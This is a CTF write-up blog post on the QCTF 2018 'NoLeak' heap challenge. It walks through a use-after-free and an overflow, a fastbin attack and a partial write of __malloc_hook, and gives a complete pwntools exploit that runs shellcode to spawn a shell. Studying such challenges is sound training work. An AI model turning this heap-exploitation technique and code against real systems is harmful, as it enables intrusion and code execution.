---
title: Partial_write-NoLeak
date: 2018-09-13 21:53:34
tags: pwn heap
layout: post
---
qctf2018-Noleak a challenge about partial write 
<!--more-->
# Analysis
[Noleak][1] 
```arm
➜  Desktop checksec NoLeak
[*] '/home/nier/Desktop/NoLeak'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
但是存在RWX 并且没开PIE
# 漏洞挖掘
* 漏洞点1
```arm
  if ( cmd <= 9 )
    free(buf[cmd]); 
```
未将指针置为0且存放指针位置在bss
* 漏洞点2
```arm

    idx = buf[(unsigned int)idx];
    if ( idx )
    {
      putsn("Size: ", 6u);
      nbytes = getn();
      putsn("Data: ", 6u);
      LODWORD(idx) = read(0, buf[v3], nbytes);  // over flower
    }
```
存在溢出
# 利用思路
* 通过上述两个漏洞可以做fast_bin_atk控制唯一已知位置:bss
* 因为main_arenaq前面就是__malloc_hook
* free掉一个大于128bytes的chunk让其挂在unsorted bin上
* partial write 其fd使其指向__malloc_hook+5-0x10 (利用7f作为合法size位)
* shellcode可以利用之前留下的一个指针写入，并且改写指向__malloc_hook+5的指针为__malloc_hook
* 利用指向__malloc_hook的指针写入shellcode的地址
* call malloc触发shellcode

#主要是partial_write 写掉__malloc_hook

# EXP
```python
from pwn import *
bin=ELF("./NoLeak")
def cmd(c):
	p.sendlineafter("choice :",str(c))
def add(size,c):	
	cmd(1)
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Data: ",c.ljust(size,"\0"))
def remove(idx):
	cmd(2)
	p.sendlineafter("Index: ",str(idx))
def edit(idx,size,c):
	cmd(3)
	p.sendlineafter("Index: ",str(idx))
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Data: ",c.ljust(size,"\0"))


#context.log_level="debug"
p=process("./NoLeak")


add(0x68,"AAAA")
add(0x68,"BBBB")
remove(1)	
payload=p64(0x601000-11)
edit(1,0x8,payload)
add(0x68,"CCCC")
add(0x68,"")	

add(0x68,'a')#0
add(0x68,'b')#1
add(0x88,'c')#2
add(0x68,'d')#4

remove(2)
remove(1)
remove(0)

edit(0,1,'\xc0')
edit(1,0x70,0x68*"A"+p64(0x71))
edit(2,1,'\x05')#use 0x7f to build fake chunk

add(0x68,"A")
add(0x68,"B")
add(0x68,"XXXX")
context.arch="amd64"
shellcode=asm(shellcraft.sh())
sh=0x601005
off=0x601078-0x601005
shellcode=shellcode.ljust(off,"\0")+"\x10"
edit(3,len(shellcode),shellcode)
edit(7,8,p64(sh))

cmd(1)
p.sendlineafter("Size: ","1")
p.interactive(">")
```

[1]:https://github.com/n132/R3t/tree/master/2018-07-15-Qctf/pwn/NoLeak_740